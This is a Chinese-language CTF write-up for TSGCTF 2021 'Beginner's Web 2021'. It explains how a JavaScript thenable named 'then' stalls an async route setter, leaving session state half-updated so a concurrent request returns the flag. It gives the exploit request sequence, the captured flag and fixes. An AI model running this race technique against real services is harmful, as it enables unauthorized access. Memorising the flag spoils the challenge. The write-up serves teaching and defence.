# TSGCTF2021 Beginner's Web 2021 WP

## 题目简述

服务为每个会话动态创建一个路由对象：

```javascript
session.routes = {
  flag: () => 'TSGCTF{...}',
  index: () => index.toString(),
  scrypt: (input) => crypto.scryptSync(input, salt, 64).toString('hex'),
  base64: (input) => Buffer.from(input).toString('base64'),
  set_salt: async (salt) => {
    session.routes = await setRoutes(session, salt);
    session.salt = salt;
    return 'ok';
  },
  [salt]: () => salt,
};
```

`GetSalt` 并不直接返回 `session.salt`，而是把 salt 当作属性名再调用：

```javascript
route = session.salt;
return session.routes[route](data);
```

利用需要结合计算属性覆盖、Promise thenable 同化和会话内两个字段的更新顺序。

## 解题过程

先取得会话 Cookie，然后设置：

```text
action=SetSalt&data=flag
```

对象字面量中 `[salt]` 位于固定 `flag` 属性之后，因此新对象里的 `flag` 被覆盖为 `() => "flag"`，同时：

```text
session.salt = "flag"
```

接着设置特殊值 `then`：

```text
action=SetSalt&data=then
```

`setRoutes(session, "then")` 已经先把 `session.routes` 换成新对象。这个对象中的固定 `flag` 函数恢复为真正返回 flag 的实现，并额外含有：

```javascript
then: () => 'then'
```

但 `setRoutes` 是 `async` 函数。JavaScript 在解析它的返回值时发现对象具有可调用的 `then` 属性，会把它当作 Promise-like thenable，并调用该函数完成同化。题目的 `then` 函数既不接收也不调用 `resolve`，所以 Promise 永远不完成。外层代码因此停在：

```javascript
await setRoutes(session, 'then')
```

尚未执行 `session.salt = "then"`。此刻形成关键的不一致状态：

```text
session.salt        = "flag"       # 仍是旧值
session.routes.flag = real flag()  # 已换成新对象
```

保持第二个请求挂起，使用同一 Cookie 再发：

```text
GET /?action=GetSalt
```

路由选择 `session.routes["flag"]()`，直接返回：

```text
TSGCTF{You_pR0ved_tHaT_you_knOW_tHe_6451C5_of_JavAsCriP7!_G0_4Nd_s0LvE_Mor3_wE6!}
```

自动化时应把设置 `then` 的请求放在独立连接中或允许其由反向代理超时，不能等待它正常完成后才发送第三个请求。

## 方法总结

本题不是普通 prototype pollution，而是 thenable 同化造成的半更新状态。函数在 `await` 前已经改写 `session.routes`，却在 `await` 后才更新 `session.salt`；攻击者用名为 `then` 的计算属性让 await 永久挂起，从而把两项会话状态撕开。修复应避免让用户输入成为内部方法名，使用 `Map` 或白名单路由，并把相关状态构造完成后一次性提交；异步函数也不应返回带不可信 `then` 属性的普通对象。
